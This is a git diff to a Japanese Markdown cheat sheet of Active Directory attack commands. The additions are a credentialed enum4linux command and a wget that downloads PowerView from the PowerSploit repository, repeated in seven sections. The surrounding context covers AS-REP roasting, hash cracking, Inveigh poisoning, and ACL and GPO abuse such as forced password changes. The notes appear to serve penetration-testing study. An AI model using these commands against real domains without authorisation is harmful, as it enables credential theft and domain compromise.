@@ -37,6 +37,12 @@ SMB、RPC、LDAP経由でWindows/Sambaホストから情報を列挙し、ユー
 ```shell
 enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 ```
+
+背腕にわかっている認証情報で
+```sh
+enum4linux -u <ユーザー名> -p <パスワード> $Target_IP
+```
+
 ### rpcclient
 RPCサービスに接続し、ドメインユーザーなどの情報を列挙（Nullセッションでも可）
 ```shell
@@ -85,6 +91,13 @@ Windowsコマンドで、ローカルまたはドメインのパスワードポ�
 net accounts
 ```
 ### PowerView
+
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
+
 PowerShellベースのツールで、Active Directoryのドメインポリシー情報の取得
 ```powershell
 Get-DomainPolicy
@@ -136,6 +149,11 @@ Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
 ```
 
 ## AS-REP Roasting
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
 ### PowerView
 Active Directory内でKerberos事前認証が不要 (`DONT_REQ_PREAUTH`) に設定されているユーザーの列挙
 ```powershell
@@ -165,6 +183,12 @@ hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt
 侵入先の環境の列挙
 ## セキュリティコントロールの確認
 ### Powershell
+
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
 Get-MpComputerStatus
 - Windows Defenderのリアルタイム保護などの状態確認
 ```powershell
@@ -303,6 +327,13 @@ Get-ADGroupMember -Identity "<GROUP_NAME>"
 ```
 ### PowerView
 PowerSploitフレームワークの一部で、Active Directoryの偵察と悪用に特化したPowerShellツール
+
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
+
 - スクリプトロード
 ```powershell
 . .\PowerView.ps1
@@ -527,7 +558,14 @@ john --wordlist=/path/to/wordlist.txt tgs_tickets
 ```
 
 ## ACL (アクセス制御リスト) の悪用
+
 ### 列挙 (PowerView)
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
+
 オブジェクトに対する不適切なACL設定（書き込み権限など）の探索
 ```powershell
 Find-InterestingDomainAcl
@@ -538,6 +576,12 @@ Find-InterestingDomainAcl
 $sid = Convert-NameToSid <USER>; Get-DomainObjectACL -ResolveGUIDs -Identity - | ? {$_.SecurityIdentifier -eq $sid}
 ```
 ### 権限行使 (PowerView例)
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
+
 発見したACLの権限を利用して、パスワード変更、グループ追加、SPN書き換えなど
 - パスワード変更
 ```powershell
@@ -555,6 +599,13 @@ Set-DomainObject -Credential <CRED_OBJ> -Identity <TARGET_USER> -SET @{servicepr
 ## GPO (グループポリシーオブジェクト) の悪用
 ### 列挙
 #### PowerView
+
+PowerViewはこいつしか信用するな
+```sh
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
+```
+
+
 ドメイン内のGPOを列挙し、その設定やACLの確認
 ```powershell
 Get-DomainGPO
